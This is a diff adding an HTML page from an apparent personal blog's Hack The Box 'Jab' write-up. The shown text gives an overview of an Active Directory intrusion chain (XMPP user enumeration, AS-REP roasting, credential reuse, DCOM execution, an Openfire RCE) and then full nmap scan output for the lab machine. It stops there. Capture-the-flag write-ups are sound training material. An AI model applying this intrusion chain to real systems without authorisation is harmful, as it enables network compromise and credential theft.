@@ -1,0 +1,1244 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=c39b064af763b0e67df460ba6674361d2c124960">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Jab writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="HTB Jab writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Jab is a Windows machine in which we need to do the following things to pwn it. First, we have a xmpp service that allows us to register a user and see all the users because of its functionality (*). Then, with that list of users, we are able to perform a ASRepRoast attack where we receive a crackable hash for jmontgomery. This credential is reused for xmpp and in his messages, we can see a pentester of the company who shares a hash for svc_openfire, which has ExecuteDCOM privileges in jab.htb and we can connect using dcomexec.py in order to have access as svc_openfire. Finally, there is a internal port that consists in a openfire old version vulnerable to RCE that allows us to gain access as Administrator." />
+<meta property="og:description" content="Jab is a Windows machine in which we need to do the following things to pwn it. First, we have a xmpp service that allows us to register a user and see all the users because of its functionality (*). Then, with that list of users, we are able to perform a ASRepRoast attack where we receive a crackable hash for jmontgomery. This credential is reused for xmpp and in his messages, we can see a pentester of the company who shares a hash for svc_openfire, which has ExecuteDCOM privileges in jab.htb and we can connect using dcomexec.py in order to have access as svc_openfire. Finally, there is a internal port that consists in a openfire old version vulnerable to RCE that allows us to gain access as Administrator." />
+<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Jab.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Jab.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-28T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Jab writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-06-28T00:00:00+02:00","datePublished":"2024-06-28T00:00:00+02:00","description":"Jab is a Windows machine in which we need to do the following things to pwn it. First, we have a xmpp service that allows us to register a user and see all the users because of its functionality (*). Then, with that list of users, we are able to perform a ASRepRoast attack where we receive a crackable hash for jmontgomery. This credential is reused for xmpp and in his messages, we can see a pentester of the company who shares a hash for svc_openfire, which has ExecuteDCOM privileges in jab.htb and we can connect using dcomexec.py in order to have access as svc_openfire. Finally, there is a internal port that consists in a openfire old version vulnerable to RCE that allows us to gain access as Administrator.","headline":"HTB Jab writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Jab.html"},"url":"http://localhost:4000/writeups/2024/HTB/Jab.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href="/writeups">Writeups</a>
+    
+     <span style="color: #b5e853;">|</span> 
+    
+    
+    <a href="/solutions">Solutions</a>
+    
+     <span style="color: #b5e853;">|</span> 
+    
+    
+    <a href="/blog">Blog</a>
+    
+    
+</small>
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+
+            <small class="m-2">2024</small>
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB Jab writeup</span> <span class="points"> [30 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+<p>Jab is a Windows machine in which we need to do the following things to pwn it. First, we have a xmpp service that allows us to register a user and see all the users because of its functionality (*). Then, with that list of users, we are able to perform a ASRepRoast attack where we receive a crackable hash for jmontgomery. This credential is reused for xmpp and in his messages, we can see a pentester of the company who shares a hash for svc_openfire, which has ExecuteDCOM privileges in jab.htb and we can connect using dcomexec.py in order to have access as svc_openfire. Finally, there is a internal port that consists in a openfire old version vulnerable to RCE that allows us to gain access as Administrator.</p>
+    
+      <h1 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port scanning <a href="#port-scanning" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
+
+<p>We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.4
+# Nmap 7.94SVN scan initiated Mon Apr 15 19:00:27 2024 as: nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.4
+Nmap scan report for 10.10.11.4
+Host is up (0.10s latency).
+Not shown: 65498 closed tcp ports (reset)
+PORT      STATE SERVICE             VERSION
+53/tcp    open  domain              Simple DNS Plus
+88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-04-15 17:00:47Z)
+135/tcp   open  msrpc               Microsoft Windows RPC
+139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
+389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-04-15T17:02:07+00:00; -2s from scanner time.
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+| Issuer: commonName=jab-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-11-01T20:16:18
+| Not valid after:  2024-10-31T20:16:18
+| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
+|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-04-15T17:02:07+00:00; -2s from scanner time.
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+| Issuer: commonName=jab-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-11-01T20:16:18
+| Not valid after:  2024-10-31T20:16:18
+| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
+|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
+3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+| Issuer: commonName=jab-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-11-01T20:16:18
+| Not valid after:  2024-10-31T20:16:18
+| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
+|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
+|_ssl-date: 2024-04-15T17:02:07+00:00; -3s from scanner time.
+3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-04-15T17:02:07+00:00; -2s from scanner time.
+| ssl-cert: Subject: commonName=DC01.jab.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb
+| Issuer: commonName=jab-DC01-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2023-11-01T20:16:18
+| Not valid after:  2024-10-31T20:16:18
+| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
+|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
+5222/tcp  open  jabber
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
+|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     features: 
+|     unknown: 
+|     compression_methods: 
+|     stream_id: 7tjrw5lhj8
+|     xmpp: 
+|       version: 1.0
+|     auth_mechanisms: 
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|_    capabilities: 
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    &lt;stream:error xmlns:stream="http://etherx.jabber.org/streams"&gt;&lt;not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
+5223/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     features: 
+|     unknown: 
+|     capabilities: 
+|     xmpp: 
+|     auth_mechanisms: 
+|     errors: 
+|       (timeout)
+|_    compression_methods: 
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
+|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
+5262/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     features: 
+|     unknown: 
+|     compression_methods: 
+|     stream_id: 7qolyzbuux
+|     xmpp: 
+|       version: 1.0
+|     auth_mechanisms: 
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|_    capabilities: 
+5263/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
+|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     features: 
+|     unknown: 
+|     capabilities: 
+|     xmpp: 
+|     auth_mechanisms: 
+|     errors: 
+|       (timeout)
+|_    compression_methods: 
+|_ssl-date: TLS randomness does not represent time
+5269/tcp  open  xmpp                Wildfire XMPP Client
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     features: 
+|     unknown: 
+|     capabilities: 
+|     xmpp: 
+|     auth_mechanisms: 
+|     errors: 
+|       (timeout)
+|_    compression_methods: 
+5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
+|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
+|_ssl-date: TLS randomness does not represent time
+5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     features: 
+|     unknown: 
+|     compression_methods: 
+|     stream_id: 5v9llxxh7r
+|     xmpp: 
+|       version: 1.0
+|     auth_mechanisms: 
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|_    capabilities: 
+5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     features: 
+|     unknown: 
+|     capabilities: 
+|     xmpp: 
+|     auth_mechanisms: 
+|     errors: 
+|       (timeout)
+|_    compression_methods: 
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
+|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
+|_ssl-date: TLS randomness does not represent time
+5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7070/tcp  open  realserver?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 15 Apr 2024 17:00:47 GMT
+|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 223
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;Openfire HTTP Binding Service&lt;/title&gt;&lt;/head&gt;
+|     &lt;body&gt;&lt;font face="Arial, Helvetica"&gt;&lt;b&gt;Openfire &lt;a href="http://www.xmpp.org/extensions/xep-0124.html"&gt;HTTP Binding&lt;/a&gt; Service&lt;/b&gt;&lt;/font&gt;&lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 15 Apr 2024 17:00:52 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   Help: 
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
+|   RPCCheck: 
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   SSLSessionReq: 
+|     HTTP/1.1 400 Illegal character CNTL=0x16
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 70
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;
+7443/tcp  open  ssl/oracleas-https?
+| ssl-cert: Subject: commonName=dc01.jab.htb
+| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
+| Issuer: commonName=dc01.jab.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-10-26T22:00:12
+| Not valid after:  2028-10-24T22:00:12
+| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
+|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 15 Apr 2024 17:00:59 GMT
+|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 223
+|     &lt;html&gt;
+|     &lt;head&gt;&lt;title&gt;Openfire HTTP Binding Service&lt;/title&gt;&lt;/head&gt;
+|     &lt;body&gt;&lt;font face="Arial, Helvetica"&gt;&lt;b&gt;Openfire &lt;a href="http://www.xmpp.org/extensions/xep-0124.html"&gt;HTTP Binding&lt;/a&gt; Service&lt;/b&gt;&lt;/font&gt;&lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 15 Apr 2024 17:01:05 GMT
+|     Allow: GET,HEAD,POST,OPTIONS
+|   Help: 
+|     HTTP/1.1 400 No URI
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 49
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
+|   RPCCheck: 
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   SSLSessionReq: 
+|     HTTP/1.1 400 Illegal character CNTL=0x16
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 70
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;
+7777/tcp  open  socks5              (No authentication; connection failed)
